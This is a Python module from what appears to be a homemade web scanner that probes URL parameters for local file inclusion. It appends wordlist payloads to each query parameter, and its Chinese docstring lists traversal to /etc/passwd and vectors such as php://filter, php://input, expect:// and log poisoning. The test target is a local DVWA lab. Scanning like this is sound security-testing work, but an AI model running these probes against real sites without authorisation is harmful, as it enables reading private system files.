import urllib.parse as urlparse
from sqlinjection import get_html
import core

'''
先完成本地文件包含模块
    最好的想法是--->提供8种不同的本地文件包含攻击模块：
        /proc/self/environ
        php://filter
        php://input
        /proc/self/fd
        access log
        phpinfo
        data://
        expect://
    暂时完成最简单的filename=../../../../../../../etc/passwd形式的本地文件包含
'''

def CheckLocalFileInclude(url):
    domain = url.split("?")[0]
    queries = urlparse.urlparse(url).query.split("&")
    if not any(queries):
        return False, None
    else:
        wordlist="NormalFileName.txt"
        payloads=[]
        core.wordlistimport(wordlist, payloads)
        for payload in payloads:
            website = domain + "?" + ("&".join([param + payload for param in queries]))
            source = get_html.gethtml(website)
            if payload in source:
                print("(+)this url have filelocalinclude bug {},payload is {}".format(url,payload))
                return True,payload
    return False,None

if __name__=='__main__':
    CheckLocalFileInclude("http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=file4.php")